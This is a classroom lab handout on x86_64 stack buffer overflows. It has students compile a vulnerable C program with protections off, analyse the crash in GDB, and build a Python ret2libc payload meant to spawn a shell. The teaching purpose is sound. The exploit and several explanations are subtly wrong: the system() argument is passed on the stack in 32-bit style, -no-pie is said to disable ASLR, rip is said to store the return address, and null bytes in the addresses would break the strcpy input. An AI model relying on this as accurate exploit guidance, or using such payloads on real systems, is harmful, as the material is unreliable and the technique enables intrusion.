# **🔥 Lab: Buffer Overflow & Exploiting Return Addresses in Linux (x86_64) 🔥**  

## **🎯 Objective**
1️⃣ **Run the program normally (no crash).**  
2️⃣ **Cause a segmentation fault using a buffer overflow.**  
3️⃣ **Analyze the crash in GDB (`rsp` and `rbp`).**  
4️⃣ **Understand how return addresses are overwritten.**  
5️⃣ **Exploit the overflow to spawn a shell (`/bin/sh`).**  

👨‍🏫 **Note:** This lab was designed with your professor’s help and ChatGPT’s assistance! 😃🔥  

---

## **🛠 Step 1: Set Up the Vulnerable Program**
### **1️⃣ Create the file (`overflow.c`)**
```bash
nano overflow.c
```
📌 **Paste this vulnerable C code:**  
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[8];  // Small buffer (only 8 bytes)
    strcpy(buffer, input);  // 🚨 No bounds checking! (Dangerous!)
    printf("You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```
✅ **Save the file!** (`CTRL + X`, `Y`, `ENTER`)  

---

## **🛠 Step 2: Compile the Program (Disable Protections)**
```bash
gcc -o overflow overflow.c -fno-stack-protector -z execstack -no-pie -g
```
### **🔍 What These Flags Do**
- `-fno-stack-protector` → **Disables stack canaries (stack protection).**  
- `-z execstack` → **Allows execution on the stack.**  
- `-no-pie` → **Disables ASLR (makes addresses predictable).**  
- `-g` → **Includes debug symbols for GDB analysis.**  

---

## **🛠 Step 3: Run the Program Normally (No Crash)**
```bash
./overflow hello
```
✅ Expected output:
```
You entered: hello
```
✅ **No crash!** The buffer safely holds `"hello"`.  

---

## **🛠 Step 4: Cause a Segmentation Fault**
Now, let's **overflow the buffer**:
```bash
./overflow AAAAAAAAAAAAAAAAAAAAA
```
🔥 Expected output:
```
Segmentation fault (core dumped)
```
✅ **Boom! We just crashed the program!**  
This means we **overwrote something critical in memory** (likely the return address).  

---

# **🛠 Step 5: Debug the Crash in GDB (Using `rsp` and `rbp`)**
Now that we **crashed the program**, let’s investigate using **GDB (GNU Debugger)**.  

### **1️⃣ Start GDB**
```bash
gdb -q ./overflow
```
📌 **Set a breakpoint at `vulnerable_function`:**  
```gdb
break vulnerable_function
```
📌 **Run with normal input first (no crash):**  
```gdb
run hello
```
💥 The program **pauses** at `vulnerable_function`.  

---

### **2️⃣ Check the Stack Before Overflow**
#### **Check Register Values**
```gdb
info registers
```
👀 Look at:  
- **`rbp`** (Base Pointer) → This **stores the previous frame pointer**.  
- **`rsp`** (Stack Pointer) → This **points to the top of the stack**.  
- **`rip`** (Instruction Pointer) → This **stores the return address**.  

#### **Check Stack Memory (`rsp`)**
```gdb
x/20gx $rsp
```
✅ You should see **normal stack values**, including the **return address** just above `rbp`.  

📌 **Continue execution normally:**  
```gdb
continue
```
✅ The program prints `"You entered: hello"` and exits **without crashing**.  

---

# **🛠 Step 6: Run the Overflow in GDB**
Now, **run the program again, but with the overflow input**:
```gdb
run AAAAAAAAAAAAAAAAAAAAA
```
💥 **Boom! Segmentation fault!**  
The program **crashes**, but GDB catches it.  

---

### **1️⃣ Check the Registers (Damage Report!)**
```gdb
info registers
```
🔍 Look at **`rip`**:  
```
rip = 0x4141414141414141
```
🔥 **Our input ("AAAA...") overwrote `rip`!**  
✅ **This confirms we control execution!**  

### **2️⃣ Look at the Stack (Corruption Confirmed!)**
```gdb
x/20gx $rsp
```
👀 You should see **our "AAAAAAA..." input written into the stack**, replacing the old return address.  

---

## **🛠 Step 7: Find the Exact Offset**
Now, let's determine **exactly how many bytes** it takes to overwrite `rip`.  

📌 **Generate a unique pattern:**  
```bash
python3 -c 'import string; print("".join(string.ascii_uppercase[:26] + string.ascii_lowercase[:26] + "0123456789")[:128])'
```
📌 **Run with this input:**  
```bash
./overflow ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
```
💥 **It crashes again!**  

📌 **Check `rip` in GDB:**  
```gdb
info registers
```
👀 Example output:  
```
rip = 0x6b6a696867666564
```
📌 **Convert it back to ASCII to find the offset:**  
```bash
python3 -c 'print(bytes.fromhex("6b6a696867666564")[::-1])'
```
🔥 **This tells us exactly how many bytes are needed before overwriting `rip`!**  

---

## **🛠 Step 8: Exploit It and Spawn a Shell**
### **1️⃣ Find `system()` and `/bin/sh`**
📌 **Find `system()` in GDB:**  
```gdb
p/x system
```
👀 Example output:
```
$1 = 0x7ffff7c50d70
```
📌 **Find `/bin/sh` manually:**  
```bash
strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```
👀 Example output:
```
1b45bd /bin/sh
```
📌 **Convert this to an actual memory address:**  
```bash
python3 -c 'print(hex(0x7ffff7c00000 + 0x1b45bd))'
```
👀 Example output:
```
0x7ffff7db45bd
```
✅ **Now we have `system()` and `/bin/sh` addresses!**  

---

### **2️⃣ Build the Final Exploit**
📌 **Modify `construct_exploit.py`**
```python
import struct

offset = <YOUR_EXACT_OFFSET>  # Adjust based on GDB findings
system_addr = 0x7ffff7c50d70  # Replace with correct system() address
binsh_addr = 0x7ffff7db45bd  # Replace with correct /bin/sh address
ret_addr = 0x0000000000000000  # Placeholder return address

payload = b"A" * offset         # Fill buffer up to `rip`
payload += struct.pack("<Q", system_addr)  # Overwrite return address with system()
payload += struct.pack("<Q", ret_addr)  # Fake return address (optional)
payload += struct.pack("<Q", binsh_addr)  # Argument to system()

print(payload.decode("latin1"))
```

📌 **Run the exploit:**  
```bash
./overflow "$(python3 construct_exploit.py)"
```
🔥 **BOOM! You should now have a shell!** 🚀  

---

# **🎯 Final Recap**
✅ Found the buffer overflow using **GDB, `$rsp`, and `$rbp`**.  
✅ Calculated the **exact offset to `rip`**.  
✅ Overwrote `rip` with `system("/bin/sh")`.  
✅ **Got a shell! 🎉**  

🚀 **Try it and let me know if you need help!** 😃🔥
